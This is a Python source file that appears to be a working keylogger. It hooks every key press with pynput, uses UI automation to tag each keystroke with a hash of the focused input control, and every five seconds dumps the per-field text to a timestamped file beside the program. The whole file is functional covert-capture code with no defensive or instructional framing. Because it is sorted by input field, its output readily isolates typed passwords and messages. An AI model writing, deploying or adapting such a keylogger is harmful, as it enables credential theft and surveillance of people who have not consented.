import argparse
from pynput.keyboard import Listener
import uiautomation as auto
import hashlib
import json
import time
import os
import sys
from threading import Timer
from contextlib import suppress
from pathlib import Path

# Dynamically get the program path
def getpath():
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)

# Command line argument parsing
parser = argparse.ArgumentParser()
parser.add_argument("--fix", action="store_true", help="Output in JSON format, categorized by inputID")
parser.add_argument("--output", type=str, help="Specify output directory", default=str(Path(getpath()).parent))
args = parser.parse_args()

# File path and cache settings
output_ext = "json" if args.fix else "txt"
OUTPUT_FILE = Path(args.output) / f"keyoutput{int(time.time())}.{output_ext}"
CACHE = {}

# Initialize file
def init_file():
    OUTPUT_FILE.write_text("{}" if args.fix else "")

# Periodically write cache to file
def save_cache():
    with OUTPUT_FILE.open("w") as f:
        if args.fix:
            json.dump(CACHE, f, indent=2)
        else:
            f.write("".join(CACHE.values()))
    Timer(5, save_cache).start()  # Refresh cache every 5 seconds

# Handle key events
def on_press(key):
    with auto.UIAutomationInitializerInThread():
        try:
            new_data = key.char or f'[{str(key).removeprefix("Key.")}]'
        except AttributeError:
            new_data = f'[{str(key).removeprefix("Key.")}]'

        new_data = new_data.replace("[space]", " ")

        # Get the current focused control
        with suppress(Exception):
            control = auto.GetFocusedControl()
            inputID = hashlib.md5(str(control.GetRuntimeId()).encode()).hexdigest()

            # Update cache
            CACHE[inputID] = CACHE.get(inputID, "") + new_data

# Main program startup
if __name__ == "__main__":
    init_file()
    save_cache()

    with Listener(on_press=on_press) as listener:
        listener.join()
